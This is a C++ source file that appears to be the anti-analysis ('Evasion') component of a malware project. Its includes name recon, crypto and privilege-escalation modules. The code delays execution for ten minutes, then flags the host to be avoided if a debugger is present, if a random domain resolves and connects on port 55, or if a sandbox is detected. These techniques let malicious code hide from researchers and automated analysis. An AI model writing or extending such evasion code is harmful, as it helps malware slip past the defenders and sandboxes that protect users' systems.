#include "Utils.h"
#include "evasion\Evasion.h"
#include "evasion\Sandbox.h"
#include "Recon.h"
#include "Crypt.h"
#include "privilegeEscalation\PrivilegeEscalation.h"

Evasion::Evasion() {
	Sleep(600000);

	Sandbox sandbox;

    if (Evasion::isBeingDebugging() || Evasion::isDomainReachable() || sandbox.DetectSandbox()) {
		this->mustBeAvoided = TRUE;
	}
};

BOOL Evasion::isBeingDebugging(void) {
	if (checkDebugger()) {
		return TRUE;
	}
	return FALSE;
}

BOOL Evasion::isDomainReachable(void) {
	std::string randomDomain = Utils::getRandomDomain();

	if (Utils::HostConnection(randomDomain, 55)) {
		return TRUE;
	}
	return FALSE;
}



